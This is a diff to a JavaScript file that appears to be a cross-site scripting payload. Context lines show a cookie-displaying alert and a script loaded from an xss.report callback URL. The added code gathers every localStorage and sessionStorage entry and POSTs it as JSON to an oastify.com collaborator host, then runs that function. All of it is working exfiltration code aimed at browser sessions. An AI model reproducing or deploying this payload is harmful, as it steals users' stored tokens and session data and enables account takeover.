@@ -70,3 +70,54 @@ alert("Here are your cookies: " + document.cookie);
 var script = document.createElement('script');
 script.src = "https://xss.report/c/abhishekdirisipo";
 document.head.appendChild(script);
+
+// Function to get all localStorage data
+function getAllLocalStorage() {
+    let localStorageObject = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        localStorageObject[key] = localStorage.getItem(key);
+    }
+    return localStorageObject;
+}
+
+// Function to get all sessionStorage data
+function getAllSessionStorage() {
+    let sessionStorageObject = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        sessionStorageObject[key] = sessionStorage.getItem(key);
+    }
+    return sessionStorageObject;
+}
+
+// Function to send storage data to the server
+async function sendStorageToServer(url) {
+    let data = {
+        localStorage: getAllLocalStorage(),
+        sessionStorage: getAllSessionStorage()
+    };
+
+    console.log('Data to be sent:', data);  // Log the data before sending
+
+    try {
+        let response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+        if (response.ok) {
+            console.log('Storage data sent successfully');
+        } else {
+            console.log('Failed to send storage data', response.statusText);
+        }
+    } catch (error) {
+        console.error('Error sending storage data:', error);
+    }
+}
+
+// Usage example
+sendStorageToServer('https://3eirmuc7kqy4p8jcvdz1g2x9107rvhj6.oastify.com');
+
